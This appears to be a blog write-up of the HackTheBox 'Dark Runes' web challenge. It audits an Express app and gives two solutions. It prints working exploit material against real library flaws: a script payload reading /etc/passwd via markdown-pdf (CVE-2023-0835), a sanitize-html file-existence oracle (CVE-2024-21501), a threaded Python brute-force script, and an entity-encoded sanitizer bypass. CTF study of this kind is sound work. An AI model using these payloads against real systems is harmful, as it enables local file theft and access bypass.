---
title: Dark Runes - HackTheBox
published: 2025-07-04
description: 'Write-up for web challenge on Hackthebox'
image: ''
tags: [web, ctf, htb]
category: 'write-up'
draft: false 
lang: ''
---

:::note
Solution Types: Intended vs. Unintended
:::

## Overview

This is the writeup for the 'Dark Runes' challenge on HackTheBox. Here is the link to the [challenge](https://app.hackthebox.com/challenges/Dark%2520Runes) . Interestingly, after solving it and doing some research online, I came across an unintended solution. That discovery surprised me and motivated me to write this writeup.

So, go first with the code auditing (maybe XD)

## Code Audit

First, we start with the ```src/index.js```:

```javascript
const express = require("express");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const authRouter = require("./routes/auth");
const documentsRouter = require("./routes/documents");
const generateRouter = require("./routes/generate.js");
const path = require("path");
const { rotatePass } = require("./utils/pass.js");

const app = express();

const PORT = process.env.PORT || 3000;

app.set("view engine", "ejs");
app.set("views", path.join(process.cwd(), "views"));

app.use(express.static(path.join(process.cwd(), "static")));

app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());

app.use(authRouter);
app.use(documentsRouter);
app.use(generateRouter);

app.listen(PORT, () => {
  rotatePass();
  console.log(`Server started on port ${PORT}`);
});

```

At here, this file imports three custom router modules that handle different parts of the application's routing logic:
1. ```authRouter``` for authentication-related routes
2. ```documentsRouter``` for document-handling routes: generate a new one or delete them
3. ```generateRouter``` for admin-only routes: export or debug (?) a document

And beside them, we have a specific function ```rotatePass``` from a ```utility``` module, used for rotating access pass.

### auth.js Analysis 

Below is detail analysis (?) for ```routes/auth.js```:

```javascript
const { generateCookie, createHash } = require('../utils/crypto');
const { addUser, findUser } = require('../database');

const router = require('express').Router();

router.get("/login", (req, res) => {
    res.render("login");
});

router.get("/register", (req, res) => {
    res.render("register");
});

router.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (typeof username !== "string" || typeof password !== "string" || username.length === 0 || password.length === 0) {
        return res.render("login", { error: "Wrong username and password format,they should not be empty" })
    }

    const user = findUser(username)

    if (!user) {
        return res.status(401).send('Invalid username or password');
    }

    const hash = createHash(password);

    if (hash !== user.password) {
        return res.render("login", { error: 'Invalid username or password' })
    }

    const token = generateCookie(user.username, user.id);
    res.cookie('user', token);
    res.redirect('/documents');
});


router.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (typeof username !== "string" || typeof password !== "string" || username.length === 0 || password.length === 0) {
        return res.render("login", { error: "Wrong username and password format,they should not be empty" })
    }

    const existingUser = findUser(username);

    if (existingUser) {
        return res.status(401).render("register", {
            error: "Username already exists"
        })
    }

    addUser(username, password)

    res.redirect('/login');
});

module.exports = router;
```

In this route, it handles 2 main logic:
1. Register: It checks the input types and then searches the database to confirm whether the account already exists.
2. Login: Logs in using an account that was previously registered.


### documents.js Analysis

This file defines the routing logic for handling user-created documents in an Express application. It includes routes for creating, viewing, listing, and deleting documents. All routes are protected with an `isAuthenticated` middleware to ensure only logged-in users can access them.


####  Middleware and Dependencies

```js
const sanitizeHtml = require("sanitize-html");
const { signString } = require("../utils/crypto");
const {
  findUserDocuments,
  findDocument,
  deleteDocument,
  addDocument,
} = require("../database");
const { isAuthenticated } = require("../middlewares");
const router = require("express").Router();
```

- **sanitize-html**: Used to sanitize input HTML to prevent XSS attacks.
- **signString**: Used to generate a hash/integrity signature for the document content.
- **Database functions**: CRUD functions imported from the database module.
- **isAuthenticated**: Middleware that ensures the user is logged in before proceeding.

---

####  `POST /documents`

Creates a new document for the currently authenticated user.

##### Logic:

- Validates `content` from the request body.
- Sanitizes the HTML content to allow only safe attributes (with limited styling for `<a>` tags).
- Signs the original content for integrity checking.
- Saves the sanitized content and its signature to the database.
- Redirects the user to `/documents`.

##### Key Security Feature:

```js
const sanitizedContent = sanitizeHtml(content, {
  allowedAttributes: {
    ...sanitizeHtml.defaults.allowedAttributes,
    a: ["style"],
  },
});
```

---

####  `GET /documents`

Lists all documents created by the currently authenticated user.

##### Logic:

- Fetches all documents by the current user ID.
- Renders the `documents.ejs` view with the user's documents.

---

####  `POST /document/:id/delete`

Deletes a document by ID if it belongs to the authenticated user.

##### Logic:

- Verifies ownership of the document.
- Deletes the document from the database if found.
- Redirects to `/documents`.
- Sends a `404` if the document is not found or does not belong to the user.

---

####  `GET /documents/new`

Renders a form page for creating a new document.

##### Logic:

- Simply renders the `create-document.ejs` template.

---

####  `GET /document/:id`

Displays a specific document by ID.

##### Logic:

- Verifies the document belongs to the user.
- Sends the document content as raw HTML (`text/html` content type).
- Returns a `404` if the document is not found or not owned by the user.

```js
res.set("Content-Type", "text/html");
return res.send(document.content);
```

---

####  Access Control

All routes are protected by:

```js
isAuthenticated
```

This ensures only logged-in users can create, read, or delete documents.

---

####  Potential Enhancements

- **Rate limiting** to avoid abuse of document creation.
- **HTML sanitization rules** could be further tightened to reduce styling abuse.
- **CSRF protection** for sensitive routes like `POST /documents` and `POST /document/:id/delete`.
- **Integrity validation** of document content (currently only generated, not validated).

---

####  Summary

| Route                    | Method | Description                       | Auth Required  |
|-------------------------|--------|------------------------------------|----------------|
| `/documents`            | GET    | List user’s documents              | Yes            |
| `/documents`            | POST   | Create new document                | Yes            |
| `/documents/new`        | GET    | Show form to create new document   | Yes            |
| `/document/:id`         | GET    | View a single document             | Yes            |
| `/document/:id/delete`  | POST   | Delete a document                  | Yes            |

---

**Module Export:**

```js
module.exports = router;
```

This allows the route to be imported and mounted in the main Express app.

---

### pass.js Analysis

This module handles the generation, rotation, and verification of access passes used for admin/debugging purposes. It intentionally avoids using persistent databases or email-based systems, relying instead on file-based control.

---

####  Dependencies

```js
const { generateRandomString, generateAccessCode } = require("./crypto");
const fs = require("fs");
```

- **generateRandomString / generateAccessCode**: Custom utility functions for generating secure random strings.
- **fs**: Node.js file system module, used for reading/writing pass files.

---

####  Global State

```js
let ACCESS_PASS = generateRandomString(32);
```

- Generates a random 32-character string used as the initial access pass.
- This is treated like a filename and also indirectly serves as the key for verifying access.

---

####  `rotatePass()`

This function is responsible for rotating the access pass by deleting the old file and creating a new one.

##### Functionality:

1. **Deletes the old access pass file**, if it exists.
2. **Generates a new access pass using `generateAccessCode()`**.
3. **Writes a file with the new pass as the filename**, and a message inside containing a new short code.

```js
fs.writeFileSync(
  String(ACCESS_PASS),
  `You Access Code is "\${generateRandomString(4)}". Please use it to access the debug features`
);
```
---

####  `verifyPass(pass)`

This function verifies whether a given pass is valid.

##### Functionality:

1. Checks if a file with the name matching the `ACCESS_PASS` exists.
2. Reads the contents of the file to ensure it's not empty.
3. Compares the provided `pass` with the current `ACCESS_PASS`.

---

##### Return Values:

- Returns `true` if the file exists, is not empty, and the `pass` matches `ACCESS_PASS`.
- Returns `false` otherwise or on any error.

---

####  Summary

| Function       | Purpose                           | Notes                                  |
|----------------|-----------------------------------|----------------------------------------|
| `rotatePass()` | Rotates the admin access pass     | Writes it to disk with a short message |
| `verifyPass()` | Verifies a given pass             | Returns true/false based on file state |

---

**Module Export:**

```js
module.exports = { verifyPass, rotatePass };
```

This allows the functions to be used throughout the application (e.g., on server startup or during admin authentication).

---

## Intended Solution

Okay, now let’s take a step back and look at what we need to do. For users without the admin role, all inputs in the document are sanitized using ```sanitizeHtml```. However, for the admin role, in the ```/document/debug/export``` route, we are allowed to inject arbitrary code to be passed into generatePDF. Here's the generatePDF function: take note that it uses the markdown-pdf package, which is vulnerable to **CVE-2023-0835**, allowing Arbitrary File Read due to improper validation of user-controlled Markdown input:

```html
<script>
    // Path Disclosure
    document.write(window.location);
    // Arbitrary Local File Read
    xhr = new XMLHttpRequest;
    xhr.onload=function(){document.write((this.responseText))};
    xhr.open("GET","file:///etc/passwd");
    xhr.send();
</script>

```

So, what do we need to do to reach this route? It requires two things: ```isAdmin``` and a valid ```ACCESS_PASS``` to be able to post content. Upon closer inspection, we can see that the project doesn’t initialize any database in the source code → meaning the database is empty by default. Then, looking at the ```/register``` route → it doesn’t validate whether we’re registering with the username ```admin``` or not → this means we can meet the ```isAdmin``` condition simply by registering with the username admin.

Next, we need to understand the logic of the ```verifyPass()```function → as mentioned earlier, this function checks whether the provided pass is valid based on the existence of the file named ```ACCESS_PASS```. Also take note that in ```package.json```, the ```sanitize-html``` package is vulnerable to **CVE-2024-21501**, which allows:

```js
// index.js
const sanitizeHtml = require('sanitize-html');

const file_exist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/sanitize-html/index.js */");'>@slonser_</a>`;
const file_notexist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/randomlibrary/index.js */");'>@slonser_</a>`;

const file_exist_clean = sanitizeHtml(file_exist, {
allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})

const file_notexist_clean = sanitizeHtml(file_notexist, {
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})
console.log(file_exist_clean, "// valid file path on backend")
console.log(file_notexist_clean, "// invalid file path on backend")
```

This gives us a working PoC:

1. Register a user with the username ```admin```, then log in with this account.
2. Exploit **CVE-2024-21501** on the ```/document``` endpoint.
3. Check which filename is the actual ```ACCESS_PASS```
4. Once you obtain both the correct ```ACCESS_PASS``` and ```isAdmin```, exploit **CVE-2023-0835** on ```/document/debug/export```.
5.  Get the flag


This is script for auto posting documents:

```python
import requests
from threading import Thread, Lock
import math
import re

BASE_URL = "http://localhost:1337"
USER_COOKIE = "eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-37aff27db740bf84dbf62a3ee676f4d9ce172c9c83a7095baca58c0a25620953"

START = 0
END = 10000
NUM_THREADS = 12
ALL_IDS = {f"{i:04d}" for i in range(10000)}
found_ids = set()
lock = Lock()

def post_documents(start, end):
    session = requests.Session()
    session.cookies.set("user", USER_COOKIE)
    for i in range(start, end):
        padded = f"{i:04}"
        print(f"[Thread {start}-{end}] Posting document {padded}")
        DOCUMENT_CONTENT = f"<a style='background-image: url(/*# sourceMappingURL={padded} */);'>@slonser_</a>"
        try:
            doc_resp = session.post(f"{BASE_URL}/documents", data={
                "content": DOCUMENT_CONTENT
            }, allow_redirects=False, timeout=10)
            if doc_resp.status_code == 302:
                print(f"[+] {padded} posted successfully!")
            else:
                print(f"[-] {padded} failed: {doc_resp.status_code} {doc_resp.text}")
        except Exception as e:
            print(f"[!] Error posting {padded}: {e}")

def fetch_all_documents():
    session = requests.Session()
    session.cookies.set("user", USER_COOKIE)
    res = session.get(f"{BASE_URL}/documents").text
    with open('out.txt', 'w') as f:
        f.write(res)
    return res.splitlines()

def process_lines(lines):
    local_ids = set()
    pattern = re.compile(r'sourceMappingURL=(\d{4})')
    for line in lines:
        local_ids.update(pattern.findall(line))
    with lock:
        found_ids.update(local_ids)

def main():
    total = END - START
    chunk = math.ceil(total / NUM_THREADS)
    threads = []

    for i in range(NUM_THREADS):
        thread_start = START + i * chunk
        thread_end = min(START + (i + 1) * chunk, END)
        t = Thread(target=post_documents, args=(thread_start, thread_end))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    lines = fetch_all_documents()

    chunk_size = len(lines) // NUM_THREADS
    threads = []

    for i in range(NUM_THREADS):
        start = i * chunk_size
        end = None if i == NUM_THREADS - 1 else (i + 1) * chunk_size
        t = Thread(target=process_lines, args=(lines[start:end],))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    missing = sorted(ALL_IDS - found_ids)
    print(f"[+] Total found: {len(found_ids)}")
    print(f"[+] Missing ({len(missing)}):")
    for mid in missing:
        print(mid)

if __name__ == "__main__":
    main()


```

We can use ctrl+F on browser to find the pattern: ```<a>```, that confirm our successful exploitation

After, run script, we got the ```ACCESS_PASS```. So now, the end is yours 🦥.

## Unintended Solution

In this solution, we already know that we can exploit **CVE-2023-0835** to read arbitrary files. However, the challenge is that the sanitizeHtml function only allows the ```<a>``` tag and the ```style``` attribute in the input. So, is there a way to bypass the automatic tag-stripping mechanism? (In this case, we don’t actually need the tags to be valid HTML — we just need them to remain intact as text before they are passed into the generatePDF function, where the exploit takes place.)

At this point, we can take advantage of how browsers render escaped characters. For example, < and > can be encoded as ```&lt;``` and ```&gt;```, so something like ```&lt;img src=#&gt;``` won’t be filtered by sanitize-html (since it treats it as normal text and doesn’t remove it), but when rendered, it will become ```<img src=#>```. From here, we can craft the payload:
```html
&lt;script&gt;
    document.write(window.location);
    xhr = new XMLHttpRequest;
    xhr.onload=function(){document.write((this.responseText))};
    xhr.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
    xhr.send();
&lt;/script&gt;
```

After triggering the export, that's it — we successfully obtain the flag.



